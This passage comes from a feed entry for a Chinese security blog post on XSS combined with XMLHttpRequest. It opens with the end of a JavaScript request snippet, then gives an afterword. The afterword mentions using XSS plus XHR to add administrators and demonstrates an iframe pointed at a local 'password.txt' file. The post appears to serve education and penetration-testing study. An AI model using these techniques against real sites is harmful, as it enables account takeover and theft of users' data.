http.send(params);}paintfunc();</code></pre><p>#0x05、题后话<br>1）、关于XSS结合XHR还有更多利用，如不能登录后台的情况下添加管理员等</p><p>2）、关于iframe没有回显的问题：这是由于iframe是通过浏览器本地同源来进行加载文件的，即不能通过网络加载，我们简单做个测试：<br>创建iframe.html,写入如下语句</p><pre><code>&lt;iframe src=&quot;file:///F:/password.txt&quot;&gt;&lt;/iframe&gt;</code></pre><p>直接在本地直接打开</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145556-ad00484a-6e65-1.png" alt="image.png"></p><p>放到网站目录下通过浏览器访问：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145602-b0b7d6d8-6e65-1.png" alt="image.png"></p><p>链接：</p><p><a href="https://www.w3schools.com/xml/xml_http.asp" target="_blank" rel="noopener">https://www.w3schools.com/xml/xml_http.asp</a> </p><p><a href="http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/" target="_blank" rel="noopener">http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/</a></p><p><a href="https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/" target="_blank" rel="noopener">https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/7473/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7473/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;#0x01、什么是XHR&lt;br&gt;X
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
